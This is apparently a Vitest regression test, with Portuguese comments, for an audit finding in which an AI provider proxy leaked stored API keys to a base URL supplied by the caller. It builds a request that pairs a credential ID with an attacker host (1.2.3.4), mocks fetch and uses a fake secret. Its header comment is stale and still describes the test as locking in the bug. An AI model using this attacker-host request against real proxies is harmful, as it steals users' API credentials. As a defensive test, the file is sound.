/**
 * CARACTERIZAÇÃO — S-01 (Crítico): `providers/test` exfiltra a chave para host do chamador.
 *
 * Achado da auditoria 2026-08 (audit-security.md S-01), confirmado por PoC. Aqui ele vira teste
 * permanente. `server/ai/proxy.ts:66-67` usa `baseUrl = baseUrl ?? c.baseUrl` e
 * `apiKey = apiKey ?? c.secret`: com `credentialId` + `baseUrl` no corpo, o host do chamador vence
 * e o SEGREDO da credencial é enviado para lá.
 *
 * Estes testes travam o comportamento ATUAL (o bug). Quando a change `audit-architecture-hardening`
 * corrigir a precedência (baseUrl/apiKey só da credencial quando há credentialId):
 *   - `test('BUG ATUAL: ...')`  passará a FALHAR  → inverta a asserção.
 *   - `test.fails('DESEJADO: ...')` passará a PASSAR → remova o `.fails`.
 * Ou seja, os dois testes são o gate reverso da correção.
 *
 * fetch é interceptado — NENHUM pacote sai da máquina. IP público literal 1.2.3.4 passa no guarda
 * SSRF (não é privado) e o mock intercepta antes de qualquer rede.
 */
import { describe, it, expect, beforeAll, afterAll, vi } from 'vitest'
import { setupEphemeralDb, type EphemeralDb } from '../harness/ephemeralDb'
import { asUserId } from '../../server/lib/authContext'

const FAKE_SECRET = 'sk-CHAVE-FALSA-DE-TESTE-nunca-real-0000'
const ATTACKER = 'http://1.2.3.4'
const OWNER = asUserId('s01-owner')

let h: EphemeralDb
let providerTest: (req: unknown, res: unknown) => Promise<void>
let credId: string
let captured: { url: string; authorization: string | null } | null

beforeAll(async () => {
  h = await setupEphemeralDb()
  ;({ providerTest } = await h.load<{ providerTest: typeof providerTest }>('../../server/ai/proxy'))
  const { credentialsRepo } = await h.load<{ credentialsRepo: {
    create: (userId: unknown, p: Record<string, unknown>) => Promise<{ id: string }>
  } }>('../../server/db/repositories/credentials')

  const cred = await credentialsRepo.create(OWNER, {
    label: 's01', kind: 'openai',
    baseUrl: 'https://api.groq.com/openai/v1', // baseUrl LEGÍTIMO salvo
    defaultModel: 'llama-3.1-8b-instant',
    secret: FAKE_SECRET,
  })
  credId = cred.id
})

afterAll(async () => { await h.cleanup() })

// mock de fetch: captura o destino e o header, sem sair da máquina
function mockFetch() {
  captured = null
  return vi.spyOn(globalThis, 'fetch').mockImplementation(async (url: string | URL | Request, opts?: RequestInit) => {
    const headers = (opts?.headers ?? {}) as Record<string, string>
    captured = { url: String(url), authorization: headers.Authorization ?? headers.authorization ?? null }
    return new Response(JSON.stringify({ choices: [{ message: { content: 'ok' } }] }),
      { status: 200, headers: { 'content-type': 'application/json' } })
  })
}

function mkRes() {
  const r: Record<string, unknown> = { _json: null as unknown, statusCode: 200, headersSent: false }
  r.status = () => r; r.json = (o: unknown) => { r._json = o; return r }
  r.setHeader = () => r; r.end = () => r; r.write = () => true; r.header = () => undefined
  return r
}

describe('S-01 — exfiltração de credencial via providers/test', () => {
  it('a chave é write-only (não volta pela listagem) — defesa que EXISTE', async () => {
    const { credentialsRepo } = await h.load<{ credentialsRepo: {
      list: (userId: unknown) => Promise<Array<Record<string, unknown>>>
    } }>('../../server/db/repositories/credentials')
    const list = await credentialsRepo.list(OWNER)
    expect(JSON.stringify(list)).not.toContain(FAKE_SECRET)
  })

  it('CORRIGIDO (S-01): credentialId + baseUrl arbitrário → o host do corpo é IGNORADO', async () => {
    const spy = mockFetch()
    const res = mkRes()
    await providerTest({ body: { credentialId: credId, baseUrl: ATTACKER }, header: () => undefined, userId: OWNER }, res)
    spy.mockRestore()

    // Após o fix: usa o baseUrl DA CREDENCIAL (api.groq.com), nunca o host do corpo (1.2.3.4).
    // A credencial ainda é exercitada (o segredo vai no header), mas para o host CERTO.
    expect(captured?.url).toContain('api.groq.com')
    expect(captured?.url ?? '').not.toContain('1.2.3.4')
  })

  it('DESEJADO (S-01): o segredo NUNCA vai para o host escolhido pelo chamador', async () => {
    const spy = mockFetch()
    const res = mkRes()
    await providerTest({ body: { credentialId: credId, baseUrl: ATTACKER }, header: () => undefined, userId: OWNER }, res)
    spy.mockRestore()

    // Asserção INTACTA do teste original (só o wrapper .fails foi removido — ela agora passa por mérito).
    expect(captured?.url ?? '').not.toContain('1.2.3.4')
  })
})
